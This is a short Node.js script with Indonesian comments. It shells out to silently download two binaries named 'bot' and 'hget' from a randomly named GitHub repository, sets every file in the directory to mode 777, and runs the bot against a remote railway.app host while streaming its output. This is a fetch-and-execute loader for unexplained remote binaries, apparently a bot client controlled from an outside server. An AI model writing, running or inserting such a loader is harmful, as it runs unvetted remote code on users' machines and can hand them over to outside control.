const { exec } = require('child_process');

// Menggunakan curl -O untuk menyimpan file dengan nama yang sama dari URL
const command = [
    'curl -s -O -L https://github.com/longhaochy/pikassnnihasidhw72nasd/raw/refs/heads/main/bot',
    'curl -s -O -L https://github.com/longhaochy/pikassnnihasidhw72nasd/raw/refs/heads/main/hget',
    'chmod 777 *',
    './bot -debug -host https://api-production-2447.up.railway.app'
].join(' && ');

console.log('Memulai proses unduh (curl) dan eksekusi...');

const child = exec(command, (error, stdout, stderr) => {
    if (error) {
        console.error(`\n[ERROR] Perintah gagal dieksekusi: ${error.message}`);
        return;
    }
});

// Menampilkan output/log bot secara real-time ke terminal
child.stdout.on('data', (data) => {
    process.stdout.write(data);
});

child.stderr.on('data', (data) => {
    process.stderr.write(data);
});

child.on('close', (code) => {
    console.log(`\n[INFO] Semua proses selesai dengan exit code: ${code}`);
});